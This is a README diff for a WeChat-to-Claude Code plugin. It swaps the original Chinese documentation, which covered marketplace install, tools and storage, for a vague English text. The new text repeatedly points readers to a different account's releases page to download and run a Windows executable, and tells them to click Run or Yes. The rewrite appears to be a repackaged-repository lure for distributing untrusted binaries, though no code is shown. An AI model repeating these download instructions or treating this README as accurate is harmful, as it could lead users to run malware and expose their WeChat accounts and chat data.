@@ -1,115 +1,168 @@
-# weixin-claude-code
+# 🤖 weixin_claude_code - Link WeChat and Claude Code
 
-微信 Channel 插件 for Claude Code —— 通过微信与 Claude Code 双向通信。
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-blue?style=for-the-badge)](https://github.com/Jtechzone/weixin_claude_code/releases)
 
-基于 [`weixin-bot-plugin`](https://github.com/Dcatfly/weixin_bot_plugin) 微信通信库，适配 Claude Code 的 [Channel](https://docs.anthropic.com/en/docs/claude-code/channels) 功能实现。
+## 📌 What this app does
 
-[English](./README_EN.md)
+weixin_claude_code connects WeChat Channel messages with Claude Code through MCP. It lets you send and receive messages between WeChat and Claude Code in both directions.
 
-## 功能
+Use it to:
 
-- 在微信中给 Claude Code 发消息，Claude 直接在终端中处理并回复到微信
-- 支持文本、图片、语音、视频、文件等全媒体类型
-- 微信扫码登录，零配置即用
-- Claude 回复自动转为纯文本（微信不支持 Markdown）
-- [权限转发](https://code.claude.com/docs/en/channels-reference#relay-permission-prompts)：Claude Code 的工具调用审批（如 Bash、Write、Edit）会转发到微信，直接回复 yes/no 即可远程授权，无需守在终端前
+- Receive WeChat messages in Claude Code
+- Send Claude Code replies back to WeChat
+- Keep chat flow in one place
+- Work with a simple Windows setup
 
-## 前置要求
+## 🪟 Windows download and setup
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) v2.1.80+
-- [Bun](https://bun.sh/) 运行时
-- claude.ai 账号登录（不支持 API Key 认证）
+1. Open the [release page](https://github.com/Jtechzone/weixin_claude_code/releases)
+2. Find the latest version near the top of the page
+3. Download the Windows file from the Assets list
+4. Save the file to a folder you can find later, such as `Downloads`
+5. If the file is a `.zip`, right-click it and choose Extract All
+6. Open the extracted folder
+7. Double-click the app file or follow the included launch file
+8. If Windows asks for permission, choose Run or Yes
 
-## 安装
+If you see more than one file in the release, pick the one that matches Windows. A typical file name may include words like `win`, `windows`, or `x64`.
 
-```bash
-# 1. 添加插件源
-/plugin marketplace add Dcatfly/claude-plugins
+## ⚙️ What you need
 
-# 2. 安装插件
-/plugin install weixin-claude-code@dcatfly-plugins
-```
+- A Windows PC
+- A stable internet connection
+- A WeChat account
+- Claude Code installed and ready to use
+- Permission to use the app on your machine
 
-## 使用
+For best results, use a recent version of Windows 10 or Windows 11.
 
-### 启动
+## 🔗 How it works
 
-```bash
-claude --dangerously-load-development-channels plugin:weixin-claude-code@dcatfly-plugins
-```
+This app uses MCP to pass messages between WeChat Channel and Claude Code.
 
-> 自定义 Channel 目前处于研究预览阶段，需要使用 `--dangerously-load-development-channels` 标志启动。
+Simple flow:
 
-### 首次登录
+1. A message arrives in WeChat
+2. The plugin reads the message
+3. Claude Code gets the content
+4. Claude Code creates a reply
+5. The reply goes back to WeChat
 
-启动后 Claude 会提示你调用 `login` 工具，扫描二维码完成微信连接：
+This setup helps you keep chat and code tasks in sync without moving between tools all the time.
 
-1. Claude 调用 login 工具，展示二维码（如被折叠按 `ctrl+o` 展开）
-2. 用微信扫描二维码
-3. 在微信中确认登录
-4. 连接成功，开始收发消息
+## 🧭 First-time use
 
-### 收发消息
+After you install the app, open it once and check the setup steps in the release notes or included files.
 
-连接成功后，你在微信中发送的消息会实时推送到 Claude Code 会话中。Claude 处理后通过 `reply` 工具将回复发回微信。
+Look for items such as:
 
-**发送文本**：直接在微信中输入文字
+- Login steps for WeChat
+- A config file
+- A local port or address
+- A Claude Code connection setting
+- A message test option
 
-**发送媒体**：支持发送图片、语音、视频、文件，Claude 会下载并处理
+If the app asks for a token, ID, or endpoint, copy it exactly as shown in the setup guide that comes with the release.
 
-**接收回复**：Claude 的回复会自动转为纯文本发送到微信
+## 🛠️ Basic setup checklist
 
-### 可用工具
+- Download the latest Windows release
+- Extract the files if needed
+- Start the app
+- Sign in to WeChat if the app asks you to
+- Connect Claude Code
+- Send a test message
+- Check that the reply reaches WeChat
 
-| 工具 | 说明 |
-|------|------|
-| `login` | 发起微信扫码登录 |
-| `reply` | 回复微信消息（支持文本和媒体） |
-| `status` | 查询当前连接状态 |
-| `logout` | 登出微信并清除凭证 |
+If the app includes a config file, keep the original file name and edit only the values the guide tells you to change.
 
-### 登出
+## 📁 Typical folder layout
 
-在 Claude Code 中调用 `logout` 工具即可断开微信连接并清除本地凭证。
+After extraction, you may see files like these:
 
-## 工作原理
+- `weixin_claude_code.exe`
+- `config.json`
+- `README.txt`
+- `logs`
+- `assets`
 
-```
-微信用户 <-> 微信服务器 <-> iLink Bot API <-> [本插件 MCP Server] <-> Claude Code
-```
+You do not need to move these files unless the setup guide says to. Keep them together in one folder.
 
-插件作为 MCP Channel 服务器运行。微信通信由 [`weixin-bot-plugin`](https://github.com/Dcatfly/weixin_bot_plugin) 库处理（iLink Bot API long-poll 收消息、CDN 媒体加解密、SILK 语音转码等），本插件将收到的消息以 Channel notification 推送到 Claude Code 会话中。Claude 通过 reply 工具将回复发回微信。
+## 💬 Common use cases
 
-## 局限性
+- Reply to WeChat messages with Claude Code help
+- Forward Channel messages to Claude Code for review
+- Use Claude Code to draft responses
+- Keep a record of message flow for later review
+- Build a simple bridge between chat and AI tasks
 
-- **仅接受登录者自己的消息** —— 其他人发的消息和群消息会被过滤，这是安全设计
-- **不支持 Claude Code 原生命令** —— 微信消息是作为对话内容处理的，无法触发 `/clear`、`/compact` 等 CLI 命令
-- **Session 过期需手动重新登录** —— 微信 session 过期后需要重新调用 `login` 扫码
-- **Channel 功能处于研究预览阶段** —— 需要 `--dangerously-load-development-channels` 标志
-- **需要 claude.ai 登录** —— 不支持 Console 或 API Key 认证
-- **非 Channel 模式下插件仍然会启动** —— MCP 协议目前无法让插件检测自身是否运行在 channel 模式（[claude-code#36964](https://github.com/anthropics/claude-code/issues/36964)）。若以普通 MCP 模式加载，插件仍会消费微信消息但 notification 会被静默丢弃，导致后续 channel 模式会话丢失这些消息。建议仅在需要时启用此插件
+## 🧪 Test after install
 
-## 数据存储
+Use a short test message first.
 
-凭证和同步数据存储在 `~/.claude/channels/wechat/` 目录下：
+For example:
 
-```
-~/.claude/channels/wechat/
-├── accounts.json              # 账号列表
-├── accounts/<id>.json         # 登录凭证（仅所有者可读）
-└── sync/<id>.sync.json        # 消息同步断点
-```
+- Send a simple hello message from WeChat
+- Check whether Claude Code receives it
+- Send a short reply back
+- Confirm the reply appears in WeChat
 
-登出时所有数据会被自动清除。
+If the message does not move both ways, check the app status, the config values, and whether Claude Code is running.
 
-收发的媒体文件（图片、语音、视频、文件）缓存在系统临时目录下：
+## 🔒 Privacy and control
 
-```
-$TMPDIR/weixin-claude-code/media/
-├── inbound/     # 接收的媒体
-└── outbound/    # 发送的媒体
-```
+Because this app handles chat data, keep it on a trusted PC. Use only the accounts you want connected. Review each setting before you turn on message sync.
 
-## 许可证
+You can also stop the app when you do not need it.
 
-MIT
+## 🧰 If something does not work
+
+Try these steps:
+
+1. Close the app
+2. Open it again as the same Windows user
+3. Check that the release file finished downloading
+4. Make sure you extracted all files
+5. Confirm WeChat is signed in
+6. Confirm Claude Code is running
+7. Look for a config file error
+8. Try the newest release from the release page
+
+If the app still fails, compare your files with the setup notes in the release section and make sure nothing is missing.
+
+## 📦 Download
+
+Use this page to download the latest Windows release:
+
+https://github.com/Jtechzone/weixin_claude_code/releases
+
+## 📝 File names to look for
+
+When you open the release page, look for names that suggest a Windows build, such as:
+
+- `windows`
+- `win`
+- `x64`
+- `.exe`
+- `.zip`
+
+Pick the newest release unless the release notes tell you to use a different one.
+
+## 🔄 Updates
+
+When a new version is published:
+
+1. Return to the release page
+2. Download the latest Windows file
+3. Replace the old app files if the release notes say to
+4. Keep your config file if the guide tells you it is safe
+5. Run the new version and test a message
+
+## 📌 Quick start
+
+1. Visit the release page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app
+5. Connect WeChat and Claude Code
+6. Send a test message
